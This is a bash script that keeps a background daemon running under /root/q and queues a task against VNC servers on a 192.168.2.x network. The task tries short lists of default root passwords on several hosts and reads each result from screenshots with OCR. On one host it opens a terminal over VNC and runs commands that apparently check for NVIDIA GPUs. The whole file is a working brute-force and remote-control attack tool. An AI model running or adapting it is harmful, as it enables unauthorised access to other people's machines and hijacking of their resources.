#!/bin/bash
set +e
echo "###P38START $(date -u)"
mkdir -p /root/q; pgrep -f '/root/q/run.sh' >/dev/null || (setsid nohup bash /root/q/run.sh >/root/q/daemon.log 2>&1 &)
cat > /root/q/p38-1795553930.todo <<'BODYEOF'
#!/bin/bash
set +e
echo "###P38START $(date -u)"
pw_try() {
  hp=$1; user=$2; pw=$3; t=$4
  timeout 30 vncdo -s $hp key enter pause 2 type "$user" key enter pause 2 type "$pw" key enter pause 4 capture /root/q/t_${t}.png 2>&1 | tail -1
  R=$(timeout 25 tesseract /root/q/t_${t}.png - 2>/dev/null | tr -s '\n' '|')
  echo "[$hp $user:$pw] $(echo "$R" | tail -c 200)"
}
echo "=== .63 PW LIST ==="
for pw in root admin 123456 onething monitor password ubuntu 'Ubuntu@2024' 'root@123'; do pw_try 192.168.2.63::5900 root "$pw" "63_$RANDOM"; done
echo "=== .45 PW LIST ==="
for pw in root admin 123456 onething monitor password; do pw_try 192.168.2.45::5900 root "$pw" "45_$RANDOM"; done
echo "=== .36 GRAPHICAL ==="
timeout 20 vncdo -s 192.168.2.36::5901 capture /root/q/g36_0.png 2>&1|tail -1
timeout 30 vncdo -s 192.168.2.36::5901 key ctrl-alt-t pause 4 capture /root/q/g36_1.png 2>&1|tail -1
echo "--- after ctrl-alt-t:"; timeout 25 tesseract /root/q/g36_1.png - 2>/dev/null | tr -s '\n' '|' | head -c 400; echo
timeout 30 vncdo -s 192.168.2.36::5901 type 'id; hostname; nvidia-smi -L; ls /dev/nvidia* | wc -l' key enter pause 5 capture /root/q/g36_2.png 2>&1|tail -1
echo "--- after cmd:"; timeout 25 tesseract /root/q/g36_2.png - 2>/dev/null | tr -s '\n' '|' | head -c 600; echo
echo "=== .41 PW ==="
for pw in root admin 123456 onething monitor; do pw_try 192.168.2.41::5900 root "$pw" "41_$RANDOM"; done
echo "###P38END $(date -u)"
BODYEOF
ls -l /root/q/ | tail -2
echo "###P38END $(date -u)"
